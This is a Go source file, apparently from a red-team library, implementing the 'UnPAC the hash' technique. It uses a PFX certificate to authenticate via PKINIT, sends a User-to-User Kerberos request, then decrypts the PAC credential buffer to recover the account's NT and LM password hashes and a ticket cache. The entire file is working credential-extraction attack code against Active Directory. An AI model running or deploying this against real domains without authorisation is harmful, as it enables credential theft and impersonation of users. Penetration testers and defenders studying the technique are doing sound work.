package pkinit

import (
	"context"
	"crypto/rsa"
	"crypto/x509"
	"encoding/asn1"
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"github.com/RedTeamPentesting/adauth"
	"github.com/RedTeamPentesting/adauth/ccachetools"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/credentials"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/iana/patype"
	"github.com/jcmturner/gokrb5/v8/krberror"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
	"github.com/oiweiwei/go-msrpc/msrpc/pac"
	"github.com/oiweiwei/go-msrpc/ndr"
)

// UnPACTheHash retrieves the user's NT hash via PKINIT using the provided PFX
// file. The DC argument is optional.
func UnPACTheHashFromPFX(
	ctx context.Context, username string, domain string, pfxFile string, pfxPassword string,
	dc string, opts ...Option,
) (*credentials.CCache, *Hash, error) {
	pfxData, err := os.ReadFile(pfxFile)
	if err != nil {
		return nil, nil, fmt.Errorf("read PFX file: %w", err)
	}

	return UnPACTheHashFromPFXData(ctx, username, domain, pfxData, pfxPassword, dc, opts...)
}

// UnPACTheHash retrieves the user's NT hash via PKINIT using the provided PFX
// data. The DC argument is optional.
func UnPACTheHashFromPFXData(
	ctx context.Context, username string, domain string, pfxData []byte, pfxPassword string,
	dc string, opts ...Option,
) (*credentials.CCache, *Hash, error) {
	cred, err := adauth.CredentialFromPFXBytes(username, domain, pfxData, pfxPassword)
	if err != nil {
		return nil, nil, fmt.Errorf("build credentials from PFX: %w", err)
	}

	if dc != "" {
		cred.SetDC(dc)
	}

	krbConf, err := cred.KerberosConfig(ctx)
	if err != nil {
		return nil, nil, fmt.Errorf("configure Kerberos: %w", err)
	}

	return UnPACTheHash(ctx, cred.Username, cred.Domain, cred.ClientCert, cred.ClientCertKey, krbConf, opts...)
}

// UnPACTheHash retrieves the user's NT hash via PKINIT using the provided
// certificates.
func UnPACTheHash(
	ctx context.Context, user string, domain string, cert *x509.Certificate, key *rsa.PrivateKey,
	krbConfig *config.Config, opts ...Option,
) (*credentials.CCache, *Hash, error) {
	dialer, roundtripDeadline, err := processOptions(opts)
	if err != nil {
		return nil, nil, err
	}

	krbConfig = &config.Config{
		LibDefaults: krbConfig.LibDefaults,
		Realms:      krbConfig.Realms,
		DomainRealm: krbConfig.DomainRealm,
	}

	krbConfig.LibDefaults.Proxiable = false

	asReq, dhClientNonce, err := NewASReq(user, domain, cert, key, key.D, krbConfig)
	if err != nil {
		return nil, nil, fmt.Errorf("build ASReq: %w", err)
	}

	asReq.PAData = append(asReq.PAData, (&PAPACRequest{IncludePAC: true}).AsPAData())

	asRep, err := ASExchange(ctx, asReq, domain, krbConfig, dialer, roundtripDeadline)
	if err != nil {
		return nil, nil, fmt.Errorf("AS exchange: %w", err)
	}

	pkinitKey, err := Decrypt(&asRep, key.D, dhClientNonce)
	if err != nil {
		return nil, nil, fmt.Errorf("decrypt ASRep: %w", err)
	}

	ccache, err := ccachetools.NewCCacheFromASRep(asRep)
	if err != nil {
		return nil, nil, fmt.Errorf("generate CCache: %w", err)
	}

	tgsReq, err := messages.NewUser2UserTGSReq(
		types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user), strings.ToUpper(asRep.CRealm), krbConfig,
		asRep.Ticket, asRep.DecryptedEncPart.Key, types.NewPrincipalName(nametype.KRB_NT_UNKNOWN, user), false, asRep.Ticket)
	if err != nil {
		return ccache, nil, fmt.Errorf("generate TGSReq: %w", err)
	}

	tgsReq.ReqBody.CName = types.PrincipalName{}

	tgsReq.PAData, err = generatePAData(user, asRep.Ticket, asRep.DecryptedEncPart.Key)
	if err != nil {
		return ccache, nil, fmt.Errorf("generate PAData sequence: %w", err)
	}

	tgsRep, err := TGSExchange(ctx, tgsReq, krbConfig, domain, dialer, roundtripDeadline)
	if err != nil {
		return ccache, nil, fmt.Errorf("TGS exchange: %w", err)
	}

	err = tgsRep.DecryptEncPart(asRep.DecryptedEncPart.Key)
	if err != nil {
		return ccache, nil, fmt.Errorf("decrypt TGSRep: %w", err)
	}

	err = tgsRep.Ticket.Decrypt(asRep.DecryptedEncPart.Key)
	if err != nil {
		return ccache, nil, fmt.Errorf("decrypt service ticket: %w", err)
	}

	ntHash, err := extractNTHash(tgsRep.Ticket, pkinitKey)
	if err != nil {
		return nil, nil, fmt.Errorf("extract NT hash: %w", err)
	}

	return ccache, ntHash, nil
}

func extractNTHash(
	tkt messages.Ticket, pkinitKey types.EncryptionKey,
) (hash *Hash, err error) {
	ifRelevant := types.ADIfRelevant{}

	for _, authData := range tkt.DecryptedEncPart.AuthorizationData {
		if authData.ADType != 1 {
			continue
		}

		_, err = asn1.Unmarshal(authData.ADData, &ifRelevant)
		if err != nil {
			return nil, fmt.Errorf("unmarshal ADIfRelevant container: %w", err)
		}
	}

	if len(ifRelevant) == 0 {
		return nil, fmt.Errorf("no ADIfRelevant container present")
	}

	var pacData []byte

	for _, authData := range ifRelevant {
		if authData.ADType != 128 {
			continue
		}

		pacData = authData.ADData
	}

	if len(pacData) == 0 {
		return nil, fmt.Errorf("no PACTYPE container present: %w", err)
	}

	pacType := pac.PACType{}

	err = ndr.Unmarshal(pacData, &pacType, ndr.Opaque)
	if err != nil {
		return nil, fmt.Errorf("unmarshal PACTYPE: %w", err)
	}

	var pacCredentialInfoBuffer []byte

	for _, buffer := range pacType.Buffers {
		if buffer.Type != 2 {
			continue
		}

		if buffer.Offset+uint64(buffer.BufferLength) > uint64(len(pacData)) {
			return nil, fmt.Errorf("PAC_CREDENTIAL_INFO buffer offset and length are outside of data range")
		}

		pacCredentialInfoBuffer = pacData[buffer.Offset : buffer.Offset+uint64(buffer.BufferLength)]
	}

	if len(pacCredentialInfoBuffer) == 0 {
		return nil, fmt.Errorf("could not find PAC_CREDENTIAL_INFO buffer")
	}

	credInfo := pac.PACCredentialInfo{}

	err = ndr.Unmarshal(pacCredentialInfoBuffer, &credInfo, ndr.Opaque)
	if err != nil {
		return nil, fmt.Errorf("unmarshal PAC_CREDENTIAL_INFO: %w", err)
	}

	credData, err := credInfo.DecryptCredentialData(pkinitKey)
	if err != nil {
		return nil, fmt.Errorf("decrypt PAC_CREDENTIAL_DATA: %w", err)
	}

	for _, cred := range credData.Credentials {
		if cred.NTLMSupplementalCredential == nil {
			continue
		}

		return NewHash(cred.NTLMSupplementalCredential)
	}

	return nil, fmt.Errorf("could not find NTLM_SUPPLEMENTAL_CREDENTIAL in SECPKG_SUPPLEMENTAL_CRED array")
}

func generatePAData(
	username string, tgt messages.Ticket, sessionKey types.EncryptionKey,
) (paData types.PADataSequence, err error) {
	auth, err := types.NewAuthenticator(tgt.Realm, types.NewPrincipalName(nametype.KRB_NT_UNKNOWN, username))
	if err != nil {
		return paData, krberror.Errorf(err, krberror.KRBMsgError, "error generating new authenticator")
	}

	auth.SeqNumber = 0

	apReq, err := messages.NewAPReq(tgt, sessionKey, auth)
	if err != nil {
		return paData, krberror.Errorf(err, krberror.KRBMsgError, "error generating new AP_REQ")
	}

	apb, err := apReq.Marshal()
	if err != nil {
		return paData, krberror.Errorf(err, krberror.EncodingError, "error marshaling AP_REQ for pre-authentication data")
	}

	return types.PADataSequence{types.PAData{
		PADataType:  patype.PA_TGS_REQ,
		PADataValue: apb,
	}}, nil
}

// Hash represents LM and NT password hashes.
type Hash struct {
	nt []byte
	lm []byte
}

func NewHash(ntlmSupplementalCredential *pac.NTLMSupplementalCredential) (*Hash, error) {
	hash := &Hash{}

	if ntlmSupplementalCredential.Flags&1 > 0 {
		hash.lm = ntlmSupplementalCredential.LMPassword
	}

	if ntlmSupplementalCredential.Flags&2 > 0 {
		hash.nt = ntlmSupplementalCredential.NTPassword
	}

	// according to the flags, there are no hashes, but we better check for ourselves
	if hash.Empty() {
		if len(ntlmSupplementalCredential.NTPassword) == 16 && nonZero(ntlmSupplementalCredential.NTPassword) {
			hash.nt = ntlmSupplementalCredential.NTPassword
		}

		if len(ntlmSupplementalCredential.LMPassword) == 16 && nonZero(ntlmSupplementalCredential.LMPassword) {
			hash.lm = ntlmSupplementalCredential.LMPassword
		}
	}

	if hash.Empty() {
		return nil, fmt.Errorf("NTLM_SUPPLEMENTAL_CREDENTIAL does not contain hashes "+
			"(Flags: 0x%x, NTPassword: 0x%x, LMPassword 0x%x)",
			ntlmSupplementalCredential.Flags,
			ntlmSupplementalCredential.NTPassword, ntlmSupplementalCredential.LMPassword)
	}

	return hash, nil
}

// NT returns the hex-encoded NT hash or an empty string if no NT hash is
// present.
func (h *Hash) NT() string {
	return hex.EncodeToString(h.nt)
}

// NTBytes returns the binary NT hash or an empty slice if no NT hash is
// present.
func (h *Hash) NTBytes() []byte {
	return h.nt
}

// NTPresent indicates whether or not an NT hash is present.
func (h *Hash) NTPresent() bool {
	return h.nt != nil
}

// LM returns the hex-encoded LM hash or an empty string if no LM hash is
// present.
func (h *Hash) LM() string {
	return hex.EncodeToString(h.lm)
}

// LMPresent indicates whether or not an LM hash is present.
func (h *Hash) LMPresent() bool {
	return h.lm != nil
}

// LMBytes returns the binary LM hash or an empty slice if no LM hash is
// present.
func (h *Hash) LMBytes() []byte {
	return h.lm
}

// Empty returns true if the structure contains neither LM nor NT hash data.
func (h *Hash) Empty() bool {
	return h.nt == nil && h.lm == nil
}

// Combined returns the hex-encoded hashes in LM:NT format. If any of these
// hashes is not present, they are replaced by their respective empty hash
// value.
func (h *Hash) Combined() string {
	lm := h.LM()
	if lm == "" {
		lm = "aad3b435b51404eeaad3b435b51404ee"
	}

	nt := h.NT()
	if nt == "" {
		nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
	}

	return lm + ":" + nt
}

func nonZero(d []byte) bool {
	for i := 0; i < len(d); i++ {
		if d[i] != 0 {
			return true
		}
	}

	return false
}
